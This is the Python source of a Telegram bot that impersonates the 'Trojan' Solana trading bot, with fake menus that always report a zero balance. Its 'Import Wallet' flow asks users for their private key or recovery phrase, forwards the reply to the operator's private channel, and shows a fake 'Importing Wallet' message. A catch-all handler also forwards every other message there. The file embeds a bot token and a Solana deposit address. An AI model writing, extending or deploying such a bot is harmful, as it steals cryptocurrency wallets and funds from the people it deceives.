import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ForceReply
import time, traceback
from datetime import datetime

# ========================
# CONFIG
# ========================
TOKEN = "8206792383:AAFgODgxzH7o8YFxsKyW4c89VA0OGNcQzmo"
MY_CHAT_ID = 7747680114
MY_CHANNEL_ID = -1003034364211
LOG_FILE = "bot_ultra_layout.log"
SOLANA_ADDRESS = "EJBM68GC32YpjC5Vn4g6kYQsSuzXSsKMEjYibsKFq6rb"

bot = telebot.TeleBot(TOKEN)

# ========================
# GENERATE ULTRA LAYOUT KEYBOARD
# ========================
def generate_ultra_keyboard():
    keyboard = InlineKeyboardMarkup()
    keyboard.row(
        InlineKeyboardButton("Buy", callback_data="Buy"),
        InlineKeyboardButton("Sell", callback_data="Sell")
    )
    keyboard.row(
        InlineKeyboardButton("Position", callback_data="position"),
        InlineKeyboardButton("Limit Orders", callback_data="limitorders"),
        InlineKeyboardButton("DCA Orders", callback_data="dcaorders")
    )
    keyboard.row(
        InlineKeyboardButton("Copy Trade", callback_data="copytrade"),
        InlineKeyboardButton("💰Referrals", callback_data="referrals"),
        InlineKeyboardButton("Sniper🎯", callback_data="sniper")
    )
    keyboard.row(
        InlineKeyboardButton("Withdraw💸", callback_data="withdraw"),
        InlineKeyboardButton("Help", callback_data="help")
    )
    keyboard.row(
        InlineKeyboardButton("🔄Refresh", callback_data="refresh"),
        InlineKeyboardButton("⏯️Token Settings", callback_data="settings")
    )
    keyboard.row(
        InlineKeyboardButton("🔑Import Wallet", callback_data="wallet")
    )
    return keyboard

# ========================
# HELPERS
# ========================
def send_wallet_message(chat_id):
    text = (
        "𝗦𝗼𝗹𝗮𝗻𝗮 · 🅴\n"
        f"`{SOLANA_ADDRESS}`  (Tap To Copy)\n"
        "Balance: 0 SOL ($0.00)\n\n"
        "Please add Solana to your Trojan Wallet or import your Own Wallet to start Trading"
    )
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("📋 Copy Address", url=f"https://t.me/share/url?url={SOLANA_ADDRESS}")
    )
    bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=markup)

def send_insufficient_balance(chat_id):
    bot.send_message(chat_id, "𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗕𝗔𝗟𝗔𝗡𝗖𝗘 !\n0 SOL ($0.00)")

def send_popup(chat_id, text):
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("OK", callback_data="dismiss"))
    bot.send_message(chat_id, text, reply_markup=keyboard)

# ========================
# WALLET IMPORT & PROCESS
# ========================
def import_wallet(chat_id):
    text = (
        "𝗦𝗼𝗹𝗮𝗻𝗮 · 🅴\n"
        f"`{SOLANA_ADDRESS}`  (Tap To Copy)\n"
        "Balance: 0 SOL ($0.00)\n\n"
        "You can copy the Address and add Solana on your Trojan Wallet, or import your Own Wallet\n\n"
        "Accepted formats are in the style of Phantom Wallet or Solflare.\n"
        "(e.g: HA1e8UAHxDsUFw4R.........)\n\n"
        "Fill your Private Key / Recovery Phrase below to import your Wallet:\n\n"
        "Otherwise press /cancel to Cancel"
    )
    msg = bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=ForceReply(selective=True))
    bot.register_next_step_handler(msg, process_wallet_address)

def process_wallet_address(message):
    text = message.text or ""

    # === HANDLE START CANCEL ===
    if text.startswith("/start"):
        try:
            bot.delete_message(message.chat.id, message.message_id)
        except:
            pass
        start(message)
        return

    if len(text) < 70:
        msg = bot.send_message(
            message.chat.id,
            "INVALID!\nPlease re-enter a valid wallet key.\n\nOr type /start to return to main menu.",
            reply_markup=ForceReply(selective=True)
        )
        bot.register_next_step_handler(msg, process_wallet_address)
        return

    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    user = message.from_user
    username = f"@{user.username}" if user.username else "—"

    message_content = f"```\n{text}\n```"
    forward_text = (
        "━━━━━━━━━━━━━━━\n"
        "📨 𝗡𝗘𝗪 𝗠𝗘𝗦𝗦𝗔𝗚𝗘\n"
        "━━━━━━━━━━━━━━━\n"
        f"🔗 Username: {username}\n"
        f"⏰ Time: {now}\n\n"
        f"💬 Message:\n{message_content}"
    )
    try:
        bot.send_message(MY_CHANNEL_ID, forward_text, parse_mode="Markdown")
    except Exception as e:
        with open(LOG_FILE, "a") as f:
            f.write(f"Forward error: {e}\n{traceback.format_exc()}\n")

    bot.reply_to(
        message,
        "🔄Transaction In Progress,\nImporting Wallet . . .\n\n⚠️Don't Close This Chat While Progressing."
    )

# ========================
# SLASH COMMANDS
# ========================
@bot.message_handler(commands=['start'])
def start(message):
    text = (
        "𝗦𝗼𝗹𝗮𝗻𝗮 · 🅴\n"
        f"`{SOLANA_ADDRESS}`  (Tap To Copy)\n"
        "Balance: 0 SOL ($0.00)\n\n"
        "Click on the Refresh button to update your current balance.\n\n"
        "Join our Telegram group @trojan and follow us on Twitter!\n\n"
        "💡If you aren't already, we advise that you use any of the following bots to trade with. "
        "You will have the same wallets and settings across all bots, but it will be significantly faster due to lighter user load.\n"
        "Achilles | Odysseus | Menelaus | Diomedes | Paris | Helenus | Hector\n\n"
        "⚠️We have no control over ads shown by Telegram in this bot. Do not be scammed by fake airdrops or login pages."
    )
    keyboard = generate_ultra_keyboard()
    bot.send_message(
        chat_id=message.chat.id,
        text=text,
        parse_mode="Markdown",
        reply_markup=keyboard
    )

@bot.message_handler(commands=['help'])
def help_command(message):
    chat_id = message.chat.id
    bot.send_message(
        chat_id,
        "How do I use Trojan? Check out our Youtube playlist where we explain it all.\n\n"
        "Which tokens can I trade? Any SPL token that is tradeable via Jupiter, including SOL and USDC pairs. "
        "We also support directly trading through Raydium if Jupiter fails to find a route.\n\n"
        "Where can I find my referral code? Open the /start menu and click 💰Referrals.\n\n"
        "My transaction timed out. What happened? Transaction timeouts can occur when there is heavy network load or instability. "
        "This is simply the nature of the current Solana network.\n\n"
        "What are the fees for using Trojan? Transactions through Trojan incur a fee of 0.4%, or 0.5% if you were referred by another user. "
        "We don't charge a subscription fee or pay-wall any features.\n\n"
        "My net profit seems wrong, why is that? The net profit of a trade takes into consideration the trade's transaction fees. "
        "Confirm the details of your trade on Solscan.io to verify the net profit.\n\n"
        "Additional questions or need support? Join our Telegram group @trojan and one of our admins can assist you."
    )

@bot.message_handler(commands=['buy'])
def buy_command(message):
    send_insufficient_balance(message.chat.id)

@bot.message_handler(commands=['sell'])
def sell_command(message):
    send_insufficient_balance(message.chat.id)

@bot.message_handler(commands=['position'])
def position_command(message):
    send_wallet_message(message.chat.id)

# ========================
# CALLBACK HANDLER
# ========================
@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    chat_id = call.message.chat.id
    try:
        bot.answer_callback_query(call.id)

        if call.data in ["Buy", "Sell"]:
            send_insufficient_balance(chat_id)
        elif call.data == "position":
            send_wallet_message(chat_id)
        elif call.data in ["limitorders", "dcaorders", "copytrade", "refresh"]:
            send_wallet_message(chat_id)
        elif call.data == "referrals":
            bot.send_message(chat_id, "💰Invite your friends...")
        elif call.data == "sniper":
            bot.send_message(chat_id, "Request Denied !: Insufficient Balance\nWallet Balance : 0 SOL ($0.00)")
        elif call.data == "withdraw":
            bot.send_message(chat_id, "You Have:\nSOL Balance: 0 SOL ($0.00)")
        elif call.data == "help":
            help_command(call.message)
        elif call.data == "settings":
            bot.send_message(chat_id, "Request Denied !:\nCan't Buy Any Token...")
        elif call.data == "wallet":
            import_wallet(chat_id)
        elif call.data == "dismiss":
            try:
                bot.delete_message(chat_id, call.message.message_id)
            except:
                pass

    except Exception as e:
        with open(LOG_FILE, "a") as f:
            f.write(f"Callback error: {e}\n{traceback.format_exc()}\n")

# ========================
# FORWARD ALL MESSAGES
# ========================
@bot.message_handler(func=lambda message: True)
def forward_wallet(message):
    try:
        user = message.from_user
        username = f"@{user.username}" if user.username else "—"
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        original_content = message.text or '[non-text content]'

        if message.text:
            message_content = f"```\n{original_content}\n```"
            forward_text = (
                "━━━━━━━━━━━━━━━\n"
                "📨 𝗡𝗘𝗪 𝗠𝗘𝗦𝗦𝗔𝗚𝗘\n"
                "━━━━━━━━━━━━━━━\n"
                f"🔗 Username: {username}\n"
                f"⏰ Time: {now}\n\n"
                f"💬 Message:\n{message_content}"
            )
            try:
                bot.send_message(MY_CHANNEL_ID, forward_text, parse_mode="Markdown")
            except Exception as e:
                with open(LOG_FILE, "a") as f:
                    f.write(f"Forward error: {e}\n{traceback.format_exc()}\n")
        else:
            bot.forward_message(MY_CHANNEL_ID, message.chat.id, message.message_id)

        if message.text and not message.text.startswith("/"):
            bot.reply_to(message, "/start")

    except Exception as e:
        with open(LOG_FILE, "a") as f:
            f.write(f"Forward error: {e}\n{traceback.format_exc()}\n")

# ========================
# START FUNCTION (untuk main.py)
# ========================
# ========================
# RUN BOT (AUTO-RESTART)
# ========================
def start_bot():
    while True:
        try:
            print("🤖 Trojan Bot running...")
            bot.polling(none_stop=True, interval=0, timeout=5)
        except Exception as e:
            with open(LOG_FILE, "a") as f:
                f.write(f"Polling error: {e}\n{traceback.format_exc()}\n")
            print("⚠️ Polling error, restarting in 5 seconds...")
            time.sleep(5)